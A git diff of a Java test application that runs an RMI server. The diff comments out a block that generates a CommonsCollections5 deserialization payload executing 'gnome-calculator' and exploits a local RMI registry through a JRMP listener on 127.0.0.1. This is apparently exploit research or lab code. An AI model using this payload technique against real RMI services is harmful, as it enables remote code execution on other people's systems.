@@ -20,6 +20,7 @@ public class App
         	Naming.bind("Test", new RemoteHelloImpl());
         	System.out.println("[+] Test RMI server is ready");
         	
+        	/**
         	// Generate an instance of the CommonsCollections5 payload exeucting "gnome-calculator"
             final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("CommonsCollections5");
             final ObjectPayload payload = payloadClass.newInstance();
@@ -39,6 +40,7 @@ public class App
             // Exploit the RMI, point to the JRMP listener
             exploit(registry, "127.0.0.1", 1337);
             System.out.println("[+] Exploited");
+            */
         }catch (Exception e) {
         	e.printStackTrace();
         }
